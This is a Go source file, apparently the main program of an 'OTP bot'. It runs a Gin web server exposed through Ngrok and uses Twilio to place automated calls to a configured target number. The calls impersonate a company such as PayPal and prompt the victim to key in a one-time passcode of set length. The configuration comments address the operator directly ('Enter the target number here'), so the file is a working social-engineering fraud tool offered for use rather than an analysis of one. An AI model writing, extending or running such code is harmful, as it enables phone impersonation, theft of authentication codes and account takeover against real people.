package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"os"
	"time"
	"twilliogo/internal/sid"
	"twilliogo/internal/twillio"
)

var (
	NgrokUrl     string = "https://" // Enter your Ngrok url here.
	TargetNumber string = "+1"       // Enter the target number here.
	TargetName   string = "doozle"   // Enter the target name here.
	Service      string = "Paypal"   // Enter the company name here for the script.
	LenDigits    int    = 6          // Enter the length of the OTP code.
	Callback     bool   = false      // Call them back? (true or false)
)

func main() {
	r := gin.New()
	gin.SetMode(gin.ReleaseMode)

	client := twillio.New(
		"", // Twillio Account Sid
		"", // Twillio Auth Token
		"", //Twillio PhoneNumber
		NgrokUrl,
	)

	r.POST("/initiate-call", client.InitiateCall)
	r.POST("/call-back", client.CallBack)
	r.POST("/ask-question", client.AskQuestion)
	r.POST("/handle-input", client.HandleInput)
	r.POST("/ask-otp", client.AskOTP)
	r.POST("/sid-status", client.CheckSid)

	go func() {
		if err := r.Run(":8080"); err != nil {
			fmt.Println("Error starting server:", err)
		}
	}()

	SidId, err := sid.GetSid(TargetNumber, TargetName, Service, NgrokUrl, LenDigits, Callback)
	if err != nil {
		fmt.Errorf("GetSid: %v", err)
	}

	go func() {
		defer func() {
			fmt.Println("Status -> Closing OTP bot.")
			os.Exit(1)
		}()

		for {
			time.Sleep(3 * time.Second)
			status, err := sid.CheckSidStatus(NgrokUrl, SidId)
			switch status {
			case "queued":
				fmt.Println("Status -> Call has been placed.")
			case "ringing":
				fmt.Println("Status -> Ringing.")
			case "in-progress":
				fmt.Println("Status -> Call In-Progress.")
			case "completed":
				fmt.Println("Status -> Call Completed.")
				return
			case "failed":
				fmt.Println("Status -> Call has failed.")
				return
			case "no-answer":
				fmt.Println("Status -> Call was not answered.")
				return
			case "canceled":
				fmt.Println("Status -> Recipient has declined call.")
				return
			case "busy":
				fmt.Println("Status -> Recipient is busy.")
				return
			default:
				fmt.Println(err)
				return
			}
		}
	}()

	select {}
}
